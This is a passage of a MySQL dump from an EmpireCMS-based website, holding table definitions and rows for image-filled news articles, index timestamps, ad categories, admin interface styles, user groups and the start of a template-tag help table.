src=\\\"/d/file/7fbacedb507e5bb0bc9115e6bd93b8ea.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/a1e0dcccc815853f06ccd9add9ddd938.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/2b2de4d22c612c544e5f25036ce8cdbf.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/c9403ad7447341e73ca6e2465965f04e.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/efa42dad545e05d273e48ddf71b3f748.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/d4f72064648708f787d9ad3c127128c1.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/3dc94b9c2ce3c486d34048d15f951b5c.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/12abd4f30326171c1b7b82f33516e28d.jpg\\\" /></p>'),(165,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/95cea93d80ae36286bb114dc4b2614a7.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/8909dfeb24f9b9f9ffc3dde8903039a6.jpg\\\" style=\\\"width: 600px; height: 600px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/39165c53bdd0bc6072346a0e675682c3.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/6d099834fbbddaa19ce7c9f975b7e2a3.jpg\\\" style=\\\"width: 600px; height: 600px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/a4c4413b32b4b645f293da9228d4e57c.jpg\\\" style=\\\"width: 600px; height: 600px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/d4ce3982b59aa5cd4e4ddcab7c17152a.jpg\\\" style=\\\"width: 600px; height: 600px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/bfde42fbd58a6ac6f61ae5321b20b390.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/1708ae491699b42fbc737767419bff38.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" />'),(166,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/e25d0ed1e8f9da9bfd440321a57930b4.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/dadd5fd4d7c47686fbc174bf417071d3.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/65a33c230956f090fb65a43a8cebbbfa.jpg\\\" style=\\\"width: 600px; height: 450px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/a39e9a70f6e2dc4c82aa6356ad8592d1.jpg\\\" style=\\\"width: 600px; height: 450px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/79ce1d86223f4fbb710e0958167ac0a6.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/8db916d909d5cd85c8326bfcf64df3a7.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/e6677caf1b713ae81cc993dfbc11e492.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" />'),(171,22,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/6f77c86ddeb672de3d00df5c40d30152.jpg\\\" style=\\\"width: 450px; height: 600px;\\\" />'),(175,26,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/54a3b4738c0e98e37453fa7634d73e8d.jpg\\\" style=\\\"width: 576px; height: 768px;\\\" />'),(176,26,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/1f3e67d5fada2884c1cf91e71743801a.jpg\\\" style=\\\"width: 576px; height: 768px;\\\" />'),(177,26,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/74520e9d913b8ddb4cb0d80a09c49cb7.jpg\\\" style=\\\"width: 576px; height: 768px;\\\" />'),(178,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/349b8a2b71361a2d42d42d3319aa8a3c.jpg\\\" style=\\\"width: 600px; height: 450px;\\\" />'),(179,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/aad6f18e8434bf5bf0f6abae61584da8.jpg\\\" style=\\\"width: 576px; height: 768px;\\\" />'),(180,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/bd5bd14b1b4616ed0f062a4e65911ba9.jpg\\\" />'),(181,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/b4600ddca80b10241f95055167d294b5.jpg\\\" style=\\\"width: 554px; height: 768px;\\\" />'),(182,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/5cffd9adbbd3aa6a9f25e1a84504d692.jpg\\\" style=\\\"width: 554px; height: 768px;\\\" />'),(183,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/c249a68274d9a93a2b249ef79829daa2.jpg\\\" style=\\\"width: 600px; height: 436px;\\\" />');
/*!40000 ALTER TABLE `libang_ecms_news_data_1` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_news_doc`
--

DROP TABLE IF EXISTS `libang_ecms_news_doc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_news_doc` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ttid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `plnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `totaldown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `newspath` char(20) NOT NULL DEFAULT '',
  `filename` char(36) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` char(20) NOT NULL DEFAULT '',
  `firsttitle` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ispic` tinyint(1) NOT NULL DEFAULT '0',
  `istop` tinyint(1) NOT NULL DEFAULT '0',
  `isqf` tinyint(1) NOT NULL DEFAULT '0',
  `ismember` tinyint(1) NOT NULL DEFAULT '0',
  `isurl` tinyint(1) NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `userfen` smallint(5) unsigned NOT NULL DEFAULT '0',
  `titlefont` char(14) NOT NULL DEFAULT '',
  `titleurl` char(200) NOT NULL DEFAULT '',
  `stb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `fstb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keyboard` char(80) NOT NULL DEFAULT '',
  `title` char(100) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepic` char(120) NOT NULL DEFAULT '',
  `eckuid` int(11) NOT NULL DEFAULT '0',
  `ftitle` char(120) NOT NULL DEFAULT '',
  `smalltext` char(255) NOT NULL DEFAULT '',
  `diggtop` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `newstime` (`newstime`),
  KEY `ttid` (`ttid`),
  KEY `firsttitle` (`firsttitle`),
  KEY `isgood` (`isgood`),
  KEY `ispic` (`ispic`),
  KEY `useridis` (`userid`,`ismember`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_news_doc`
--

LOCK TABLES `libang_ecms_news_doc` WRITE;
/*!40000 ALTER TABLE `libang_ecms_news_doc` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_news_doc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_news_doc_data`
--

DROP TABLE IF EXISTS `libang_ecms_news_doc_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_news_doc_data` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keyid` varchar(255) NOT NULL DEFAULT '',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `newstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `haveaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `infotags` varchar(80) NOT NULL DEFAULT '',
  `writer` varchar(30) NOT NULL DEFAULT '',
  `befrom` varchar(60) NOT NULL DEFAULT '',
  `newstext` mediumtext NOT NULL,
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_news_doc_data`
--

LOCK TABLES `libang_ecms_news_doc_data` WRITE;
/*!40000 ALTER TABLE `libang_ecms_news_doc_data` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_news_doc_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_news_doc_index`
--

DROP TABLE IF EXISTS `libang_ecms_news_doc_index`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_news_doc_index` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `checked` (`checked`),
  KEY `newstime` (`newstime`),
  KEY `truetime` (`truetime`,`id`),
  KEY `havehtml` (`classid`,`truetime`,`havehtml`,`checked`,`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_news_doc_index`
--

LOCK TABLES `libang_ecms_news_doc_index` WRITE;
/*!40000 ALTER TABLE `libang_ecms_news_doc_index` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_news_doc_index` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_news_index`
--

DROP TABLE IF EXISTS `libang_ecms_news_index`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_news_index` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `checked` (`checked`),
  KEY `newstime` (`newstime`),
  KEY `truetime` (`truetime`,`id`),
  KEY `havehtml` (`classid`,`truetime`,`havehtml`,`checked`,`id`)
) ENGINE=MyISAM AUTO_INCREMENT=184 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_news_index`
--

LOCK TABLES `libang_ecms_news_index` WRITE;
/*!40000 ALTER TABLE `libang_ecms_news_index` DISABLE KEYS */;
INSERT INTO `libang_ecms_news_index` VALUES (1,12,1,1586932383,1586932415,1587022767,1),(180,20,1,1646374818,1646374836,1646375054,1),(73,21,1,1587006655,1587006698,1587006698,1),(4,6,1,1586932479,1586932489,1593483506,1),(5,7,1,1586934466,1586934690,1586934843,1),(6,7,1,1586934692,1586934829,1586934829,1),(7,7,1,1586934847,1586934874,1586934874,1),(8,7,1,1586934876,1586934910,1586934910,1),(9,7,1,1586934912,1586934939,1586934939,1),(10,7,1,1586934941,1586934966,1586934966,1),(11,7,1,1586934968,1586935016,1586935016,1),(12,7,1,1586935018,1586935041,1586935041,1),(13,7,1,1586935043,1586935276,1586935276,1),(14,7,1,1586935278,1586935317,1586935317,1),(15,7,1,1586935319,1586935341,1586935341,1),(16,8,1,1586935418,1586935453,1586935453,1),(17,8,1,1586935455,1586935478,1586935478,1),(18,8,1,1586935480,1586935508,1586935508,1),(19,8,1,1586935529,1586935549,1586935549,1),(20,8,1,1586935551,1586935576,1586935576,1),(21,9,1,1586935687,1586935723,1586935723,1),(22,9,1,1586935725,1586935752,1586935752,1),(23,9,1,1586935755,1586935791,1586935791,1),(24,9,1,1586935793,1586935814,1586935814,1),(25,9,1,1586935816,1586935843,1586935843,1),(26,9,1,1586935845,1586935888,1586935888,1),(27,9,1,1586936018,1586936044,1586936044,1),(28,9,1,1586936047,1586936077,1586936077,1),(29,10,1,1586939847,1586939872,1586939872,1),(30,10,1,1586939874,1586939898,1586939898,1),(31,10,1,1586939900,1586939916,1586939916,1),(32,10,1,1586939919,1586939940,1586939940,1),(33,10,1,1586939942,1586939964,1586939964,1),(34,10,1,1586939966,1586939990,1586939990,1),(35,10,1,1586939993,1586940010,1586940010,1),(36,11,1,1586940075,1586940092,1586940092,1),(37,11,1,1586940094,1586940153,1586940153,1),(38,11,1,1586940155,1586940176,1586940176,1),(39,11,1,1586940188,1586940206,1586940206,1),(40,11,1,1586940208,1586940246,1586940246,1),(41,11,1,1586940248,1586940270,1586940270,1),(42,11,1,1586940272,1586940297,1586940297,1),(43,18,1,1586940549,1586940580,1586940600,1),(44,18,1,1586940604,1586940630,1586940630,1),(45,18,1,1586940632,1586940653,1586940653,1),(46,18,1,1586940655,1586940679,1586940679,1),(47,18,1,1586940681,1586940704,1586940704,1),(48,18,1,1586940706,1586940725,1586940725,1),(49,18,1,1586940728,1586940744,1586940744,1),(170,22,1,1589268238,1589268474,1589268719,1),(51,18,1,1586940764,1586940784,1586940784,1),(52,18,1,1586940787,1586940800,1586940800,1),(53,18,1,1586940803,1586940818,1586940818,1),(54,15,1,1586940875,1586940885,1586940885,1),(55,15,1,1586940887,1586940922,1586940922,1),(56,15,1,1586940924,1586940955,1586940955,1),(57,15,1,1586940957,1586940975,1586940975,1),(58,15,1,1586940977,1586940998,1586940998,1),(59,15,1,1586941000,1586941030,1586941030,1),(60,15,1,1586941043,1586941059,1586941428,1),(61,15,1,1586941061,1586941079,1586941405,1),(62,15,1,1586941081,1586941107,1586941392,1),(63,15,1,1586941110,1586941124,1586941377,1),(179,20,1,1646374800,1646374817,1646375047,1),(178,20,1,1646371004,1646371010,1646375037,1),(177,26,1,1589269408,1589269429,1589269429,1),(176,26,1,1589269385,1589269404,1589269404,1),(175,26,1,1589269354,1589269381,1589269381,1),(169,20,1,1588734854,1588734876,1588735125,1),(168,20,1,1588734824,1588734852,1588734920,1),(167,20,1,1588734320,1588734822,1588735134,1),(74,21,1,1587006703,1587006721,1587006721,1),(75,21,1,1587006723,1587006739,1587006739,1),(76,21,1,1587006741,1587006761,1587006761,1),(77,21,1,1587006763,1587006783,1587006783,1),(78,21,1,1587006785,1587006810,1587006810,1),(79,21,1,1587006812,1587006844,1587006844,1),(80,21,1,1587006847,1587006865,1587006865,1),(81,13,1,1587021343,1587021353,1587021505,1),(92,14,1,1587611642,1587611738,1588745121,1),(93,18,1,1587616116,1587616148,1587616148,1),(94,18,1,1587616150,1587616170,1587616170,1),(95,18,1,1587616173,1587616196,1587616196,1),(99,18,1,1587621030,1587621056,1587621056,1),(100,18,1,1587621058,1587621082,1587621082,1),(98,18,1,1587616484,1587616505,1587616505,1),(101,11,1,1587621337,1587621370,1587621370,1),(102,20,1,1587621940,1587621959,1589267658,1),(103,20,1,1587621961,1587621976,1589267649,1),(104,20,1,1587621978,1587621999,1589267641,1),(105,20,1,1587622023,1587622038,1589267634,1),(173,22,1,1589268852,1589268880,1589268880,1),(172,22,1,1589268816,1589268849,1589268889,1),(171,22,1,1589268738,1589268810,1589268810,1),(147,18,1,1587697981,1587698300,1587698870,1),(117,8,1,1587695359,1587695426,1587695426,1),(118,8,1,1587695428,1587695443,1587695443,1),(174,26,1,1589269313,1589269349,1589269349,1),(120,8,1,1587695471,1587695483,1589269102,1),(121,8,1,1587695485,1587695498,1589269112,1),(122,8,1,1587695500,1587695512,1589269122,1),(123,8,1,1587695514,1587695526,1589269131,1),(124,8,1,1587695529,1587695543,1589269140,1),(125,8,1,1587695545,1587695562,1589269149,1),(126,8,1,1587695564,1587695577,1589269158,1),(127,8,1,1587695579,1587695594,1589269167,1),(128,24,1,1587695624,1587695644,1587695669,1),(129,24,1,1587695672,1587695694,1587695694,1),(130,24,1,1587695696,1587695708,1587695708,1),(131,24,1,1587695711,1587695722,1587695722,1),(132,23,1,1587695771,1587695798,1587695798,1),(133,23,1,1587695800,1587695813,1587695813,1),(134,23,1,1587695815,1587695826,1587695826,1),(135,23,1,1587695828,1587695846,1587695846,1),(136,23,1,1587695848,1587695863,1587695863,1),(137,23,1,1587695865,1587695877,1587695877,1),(138,23,1,1587695879,1587695893,1587695893,1),(139,23,1,1587695895,1587695906,1587695906,1),(140,23,1,1587695909,1587695926,1587695926,1),(141,23,1,1587695928,1587695942,1587695942,1),(142,23,1,1587695944,1587695956,1587695956,1),(143,23,1,1587695959,1587695971,1587695971,1),(144,23,1,1587695974,1587695989,1587695989,1),(145,23,1,1587695991,1587696040,1587696040,1),(146,23,1,1587696043,1587696059,1587696059,1),(148,18,1,1587698307,1587698378,1587698881,1),(149,18,1,1587698425,1587698533,1587698894,1),(150,18,1,1587698535,1587698665,1587698927,1),(151,18,1,1587698668,1587698721,1587698956,1),(152,18,1,1587698723,1587698827,1587698979,1),(153,18,1,1587698983,1587699082,1587699082,1),(154,18,1,1587699084,1587699134,1587699134,1),(155,18,1,1587699137,1587699180,1587699180,1),(156,18,1,1587699182,1587699323,1587699323,1),(157,18,1,1587699326,1587699404,1587699404,1),(158,18,1,1587699406,1587699510,1587699510,1),(159,18,1,1587699512,1587699617,1587699617,1),(160,18,1,1587699619,1587699717,1587699717,1),(161,18,1,1587699720,1587699938,1587699938,1),(162,18,1,1587699940,1587699982,1587699982,1),(163,18,1,1587699984,1587700106,1587700106,1),(164,18,1,1587700108,1587700285,1587700285,1),(165,18,1,1588152158,1588152755,1589427209,1),(166,18,1,1588152758,1588152945,1589427191,1),(181,20,1,1646374868,1646374883,1646375061,1),(182,20,1,1646374884,1646374900,1646375067,1),(183,20,1,1646374901,1646374916,1646375072,1);
/*!40000 ALTER TABLE `libang_ecms_news_index` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsad`
--

DROP TABLE IF EXISTS `libang_enewsad`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsad` (
  `adid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `picurl` varchar(255) NOT NULL DEFAULT '',
  `url` text NOT NULL,
  `pic_width` int(10) unsigned NOT NULL DEFAULT '0',
  `pic_height` int(10) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `adtype` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `title` varchar(100) NOT NULL DEFAULT '',
  `target` varchar(10) NOT NULL DEFAULT '',
  `alt` varchar(120) NOT NULL DEFAULT '',
  `starttime` date NOT NULL DEFAULT '0000-00-00',
  `endtime` date NOT NULL DEFAULT '0000-00-00',
  `adsay` varchar(255) NOT NULL DEFAULT '',
  `titlefont` varchar(14) NOT NULL DEFAULT '',
  `titlecolor` varchar(10) NOT NULL DEFAULT '',
  `htmlcode` text NOT NULL,
  `t` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ylink` tinyint(1) NOT NULL DEFAULT '0',
  `reptext` text NOT NULL,
  PRIMARY KEY (`adid`),
  KEY `classid` (`classid`),
  KEY `t` (`t`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsad`
--

LOCK TABLES `libang_enewsad` WRITE;
/*!40000 ALTER TABLE `libang_enewsad` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsad` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsadclass`
--

DROP TABLE IF EXISTS `libang_enewsadclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsadclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` char(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsadclass`
--

LOCK TABLES `libang_enewsadclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsadclass` DISABLE KEYS */;
INSERT INTO `libang_enewsadclass` VALUES (1,'默认广告分类');
/*!40000 ALTER TABLE `libang_enewsadclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsadminstyle`
--

DROP TABLE IF EXISTS `libang_enewsadminstyle`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsadminstyle` (
  `styleid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `stylename` char(30) NOT NULL DEFAULT '',
  `path` smallint(5) unsigned NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`styleid`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsadminstyle`
--

LOCK TABLES `libang_enewsadminstyle` WRITE;
/*!40000 ALTER TABLE `libang_enewsadminstyle` DISABLE KEYS */;
INSERT INTO `libang_enewsadminstyle` VALUES (1,'管理员后台界面',1,1),(2,'编辑后台界面',2,0);
/*!40000 ALTER TABLE `libang_enewsadminstyle` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsag`
--

DROP TABLE IF EXISTS `libang_enewsag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsag` (
  `agid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `agname` varchar(60) NOT NULL DEFAULT '',
  `isadmin` tinyint(1) NOT NULL DEFAULT '0',
  `auids` text NOT NULL,
  PRIMARY KEY (`agid`),
  KEY `isadmin` (`isadmin`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsag`
--

LOCK TABLES `libang_enewsag` WRITE;
/*!40000 ALTER TABLE `libang_enewsag` DISABLE KEYS */;
INSERT INTO `libang_enewsag` VALUES (1,'管理员',9,''),(2,'版主',5,'');
/*!40000 ALTER TABLE `libang_enewsag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsautodo`
--

DROP TABLE IF EXISTS `libang_enewsautodo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsautodo` (
  `doid` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `dotype` char(50) NOT NULL DEFAULT '',
  `classid` int(11) NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `tid` int(10) unsigned NOT NULL DEFAULT '0',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `dotime` int(10) unsigned NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `pid` int(11) NOT NULL DEFAULT '0',
  `ckstr` char(32) NOT NULL DEFAULT '',
  `fname` char(255) NOT NULL DEFAULT '',
  `ecmspno` char(32) NOT NULL DEFAULT '',
  `ckpass` char(32) NOT NULL DEFAULT '',
  PRIMARY KEY (`doid`),
  KEY `userid` (`userid`),
  KEY `pid` (`pid`),
  KEY `dotime` (`dotime`),
  KEY `ckstr` (`ckstr`),
  KEY `ecmspno` (`ecmspno`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsautodo`
--

LOCK TABLES `libang_enewsautodo` WRITE;
/*!40000 ALTER TABLE `libang_enewsautodo` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsautodo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsbefrom`
--

DROP TABLE IF EXISTS `libang_enewsbefrom`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsbefrom` (
  `befromid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `sitename` char(60) NOT NULL DEFAULT '',
  `siteurl` char(200) NOT NULL DEFAULT '',
  PRIMARY KEY (`befromid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsbefrom`
--

LOCK TABLES `libang_enewsbefrom` WRITE;
/*!40000 ALTER TABLE `libang_enewsbefrom` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsbefrom` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsbq`
--

DROP TABLE IF EXISTS `libang_enewsbq`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsbq` (
  `bqid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `bqname` varchar(60) NOT NULL DEFAULT '',
  `bqsay` text NOT NULL,
  `funname` varchar(60) NOT NULL DEFAULT '',
  `bq` varchar(60) NOT NULL DEFAULT '',
  `issys` tinyint(1) NOT NULL DEFAULT '0',
  `bqgs` text NOT NULL,
  `isclose` tinyint(1) NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`bqid`),
  KEY `classid` (`classid`),
  KEY `isclose` (`isclose`),
  KEY `myorder` (`myorder`)
) ENGINE=MyISAM AUTO_INCREMENT=32 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsbq`
--

LOCK TABLES `libang_enewsbq` WRITE;
/*!40000 ALTER TABLE `libang_enewsbq` DISABLE KEYS */;
INSERT INTO `libang_enewsbq` VALUES (1,'文字调用标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">栏目ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看栏目ID点<a onclick=\\\"window.open(\\\'../ListClass.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a>，查看标题分类ID点<a onclick=\\\"window.open(\\\'../info/InfoType.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a>,当前ID=\\\'selfinfo\\\'<br />\r\n            多个栏目ID与标题分类ID可用,号格开，如\\\'1,2\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示条数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">显示前几条记录</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标题截取数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">截取几个字符</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示时间</div>\r\n            </td>\r\n            <td height=\\\"25\\\">是否在标题后显示时间，0为不显示，1为显示</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div 